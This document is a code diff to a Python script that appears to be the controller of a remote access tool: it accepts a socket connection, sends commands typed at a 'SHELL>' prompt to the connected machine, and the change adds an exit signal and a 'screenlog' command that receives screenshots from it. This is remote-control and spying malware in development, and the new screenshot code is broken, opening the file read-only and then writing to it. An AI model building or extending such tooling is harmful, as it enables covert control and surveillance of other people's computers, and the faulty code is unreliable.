@@ -1,6 +1,6 @@
 import socket, os, threading
 
-IP = "192.168.0.15"
+IP = "192.168.0.16"
 PORT = 6667
 BUFFER = 1024
 
@@ -16,9 +16,19 @@ if conn:
     while True:
         cmd = input("SHELL> ")
         if cmd == "exit":
+            conn.send("exit".encode("utf-8"))
             break
         if cmd == "stay":
             print("[/] await the pc start!")
+        if cmd == "screenlog":
+            print("[-] awaiting data ...")
+            data = conn.recv(2048)
+            with open('screenshot.jpg', 'rb') as f:
+                try:
+                    f.write(data.decode('utf-8'))
+                    print("data recived and photo saved")
+                except:
+                    print("error to decode the img!")
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
         print(output)
